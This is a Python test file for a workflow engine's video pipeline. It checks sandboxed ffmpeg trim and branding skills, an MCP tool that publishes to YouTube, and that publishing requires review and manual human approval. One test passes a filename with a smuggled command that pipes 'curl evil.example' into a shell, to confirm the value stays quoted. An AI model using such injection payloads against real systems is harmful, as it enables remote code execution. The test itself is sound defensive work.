"""The video-to-YouTube case, authored out of the new objects.

The test of phases 1-3 is whether the example the operator gave can be built WITHOUT touching
engine code: take a video, cut a clip by start and end, brand it, have a person look, publish to
a channel. If any of it needs a new Python executor or a new capability, the phases were wrong.

Every object here is one an operator could author through the Skills area and the workflow
agent. Nothing in this file imports anything that had to be written for YouTube specifically.
"""
import pytest

from boss_engine.services import skill_definitions as sd
from boss_engine.services.workflow_capabilities import validate_custom_step
from boss_engine.services.workflows import WorkflowValidationError, validate_workflow_spec
from boss_engine.tools.builtin import _spec_from_steps

FFMPEG = "ghcr.io/acme/ffmpeg@sha256:" + "1" * 64


def _trim_config():
    return sd.validate_config(
        "sandboxed_command",
        {
            "image": FFMPEG,
            # The operator's own command. Inputs are quoted at build time, so a filename with a
            # semicolon in it is a filename.
            "command": ("ffmpeg -i {video} -ss {start} -to {end} -c copy "
                        "{workdir}/clip.mp4"),
            "timeout_seconds": 900,
            "outputs": [{"name": "clip"}],
        },
        ["video", "start", "end"],
    )


def test_trimming_a_clip_is_an_authorable_skill():
    config = _trim_config()
    assert config["image"] == FFMPEG
    assert config["network"] is False          # cutting a video needs no internet
    assert config["outputs"] == [{"name": "clip", "required": True, "description": ""}]


def test_branding_a_clip_is_another_one():
    config = sd.validate_config(
        "sandboxed_command",
        {"image": FFMPEG,
         "command": ("ffmpeg -i {clip} -i {watermark} -filter_complex overlay=10:10 "
                     "{workdir}/branded.mp4"),
         "outputs": [{"name": "branded"}]},
        ["clip", "watermark"],
    )
    assert "overlay" in config["command"]


def test_publishing_is_an_mcp_skill_and_not_a_command():
    """The account lives in an MCP server; the skill names one of its tools. An integration is
    not invocable on its own — BOSS's own rule, stated in workflow_custom_steps."""
    config = sd.validate_config(
        "mcp_tool", {"mcp_server_id": "mcp_youtube", "tool_name": "videos.insert"}, [])
    assert config == {"mcp_server_id": "mcp_youtube", "tool_name": "videos.insert"}


def test_publishing_must_be_reviewed_before_it_can_be_placed():
    """Publishing to a channel is irreversible and public. `validate_custom_step` already
    refused an untrusted skill with that much reach — this is that rule doing its job on a skill
    an operator authored rather than one BOSS shipped."""
    unreviewed = {"enabled": True, "risk_tier": 3, "provenance": {"trusted": False}}
    problems = validate_custom_step(
        {"id": "publish", "binding": {"skill_id": "publish_youtube"},
         "approval": {"mode": "manual"}}, unreviewed)
    assert any("untrusted" in p for p in problems)

    reviewed = {"enabled": True, "risk_tier": 3, "provenance": {"trusted": True}}
    assert validate_custom_step(
        {"id": "publish", "binding": {"skill_id": "publish_youtube"},
         "approval": {"mode": "manual"}}, reviewed) == []


def test_publishing_cannot_be_set_to_auto():
    reviewed = {"enabled": True, "risk_tier": 3, "provenance": {"trusted": True}}
    problems = validate_custom_step(
        {"id": "publish", "binding": {"skill_id": "publish_youtube"},
         "approval": {"mode": "auto"}}, reviewed)
    assert any("requires a person" in p for p in problems)


def test_the_whole_workflow_validates():
    """Four steps, three of them custom, one a human gate — and a named captain on the publish
    so the same step can serve a different channel by being given a different agent."""
    spec = _spec_from_steps([
        {"id": "trim", "capability": "custom", "skill": "trim_clip"},
        {"id": "brand", "capability": "custom", "skill": "brand_clip"},
        {"id": "watch", "capability": "spec_review"},
        {"id": "publish", "capability": "custom", "skill": "publish_youtube",
         "captain": "release_manager", "approval": "manual"},
    ], {})
    validated = validate_workflow_spec(spec)
    assert [s["id"] for s in validated["steps"]] == ["trim", "brand", "watch", "publish"]
    assert validated["steps"][-1]["captain"] == "release_manager"
    assert validated["steps"][-1]["approval"]["mode"] == "manual"


def test_and_nothing_in_this_case_needed_a_new_capability():
    """The point of the exercise. `custom` plus a skill covers all three bespoke steps; the
    human gate is `spec_review`, which already existed."""
    spec = _spec_from_steps([
        {"id": "trim", "capability": "custom", "skill": "trim_clip"},
        {"id": "watch", "capability": "spec_review"},
    ], {})
    kinds = {s["binding"].get("capability") or "custom" for s in spec["steps"]}
    assert kinds == {"custom", "spec_review"}


def test_a_malicious_filename_stays_a_filename():
    """The whole risk of sandboxed_command, exercised on the case that motivated it: a video
    path is operator input, and this is a media pipeline where filenames come from elsewhere."""
    from boss_engine.services.skill_executors import build_sandbox_command

    built = build_sandbox_command(
        _trim_config()["command"],
        {"video": "holiday.mp4; curl evil.example | sh", "start": "0", "end": "10"})
    assert "'holiday.mp4; curl evil.example | sh'" in built
    assert built.count("|") == 1        # the only pipe is inside the quoted argument
